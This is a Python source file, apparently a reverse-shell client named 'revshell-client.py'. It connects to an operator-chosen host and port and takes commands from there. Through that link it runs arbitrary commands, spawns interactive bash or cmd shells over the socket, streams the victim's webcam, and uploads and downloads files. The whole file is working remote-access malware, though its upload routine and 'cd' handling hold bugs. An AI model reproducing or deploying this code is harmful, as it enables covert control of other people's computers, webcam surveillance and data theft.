import socket
import os
import subprocess
import sys
import subprocess
import cv2
import pickle
import struct
import imutils
import platform
import time
import threading

# Supposed to be a stable bash shell, works
# on the client but not on the server

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

def windows_shell(s):

	p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

	s2p_thread = threading.Thread(target=s2p, args=[s, p])
	s2p_thread.daemon = True
	s2p_thread.start()

	p2s_thread = threading.Thread(target=p2s, args=[s, p])
	p2s_thread.daemon = True
	p2s_thread.start()

	try:
		p.wait()
	except KeyboardInterrupt:
		s.close()

def spawn_shell(s):
	stdin = os.dup(0)
	stdout = os.dup(1)
	stderr = os.dup(2)
	
	if platform.system() == 'Linux':
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		subprocess.run(["/bin/bash","-i"])
		os.dup2(stdin, 0)
		os.dup2(stdout, 1)
		os.dup2(stderr, 2)
		os.close(stdin)
		os.close(stdout)
		os.close(stderr)
	elif platform.system() == 'Windows':
		windows_shell(s)

# Capture video with webcam

class VideoStream:
	def __init__(self, s):
		self.s = s

	def send(self):
		vid = cv2.VideoCapture(0)
		while(vid.isOpened()):
			img,frame = vid.read()
			a = pickle.dumps(frame)
			message = struct.pack("Q", len(a)) + a
			self.s.sendall(message)

class FileTransfer:
	def __init__(self, s):
		self.s = s

	def send(self, file):
		try:
			file_size = os.stat(file).st_size
		except FileNotFoundError:
			self.s.send('0'.encode())
			return
		self.s.send((str(file_size) + '\n').encode())
		with open(file, 'r') as f:
			while file_size > 0:
				data = f.readline()
				file_size -= len(data)
				self.s.send(data.encode())

	def receive(self, file, recv_path):
		splitted = self.client_socket.recv(BUFFER_SIZE).decode().split('\n', 1)
		file_size = int(splitted[0])
		if file_size == 0:
			print(f"Could not open {file}")
			return
		data = splitted[1]
		with open(recv_path, 'w') as f:
			while file_size > 0:
				data = self.client_socket.recv(BUFFER_SIZE).decode()
				file_size -= len(data)
				f.write(data)


def main(SERVER_HOST, SERVER_PORT):
	BUFFER_SIZE = 1024 * 128

	s = socket.socket()
	s.connect((SERVER_HOST, SERVER_PORT))
	while True:
		command = s.recv(BUFFER_SIZE).decode().strip()
		if not command:
			break
		splitted_command = command.split(" ", 1)
		if command == "exit":
			break
		if splitted_command[0] == "cd":
			try:
				os.chdir(' '.join(splited_command[1:]))
			except FileNotFoundError as e:
				output = str(e)
			else:
				output = ""
		elif splitted_command[0] == "webcam":
			stream = VideoStream(s)
			stream.send()
		elif splitted_command[0] == "download":
			file = splitted_command[1]
			transfer = FileTransfer(s)
			transfer.send(file)
		elif splitted_command[0] == "upload":
			path = splitted_command[1]
			transfer = FileTransfer(s)
			transfer.receive(path)
		elif command == "shell":
			spawn_shell(s)
		else:
			output = subprocess.getoutput(command)
			s.send(output.encode())
	s.close()


if __name__ == '__main__':
	if len(sys.argv) != 3:
		print("Usage: python3 revshell-client.py <ip> <port>")
		exit(1)
	main(sys.argv[1], int(sys.argv[2]))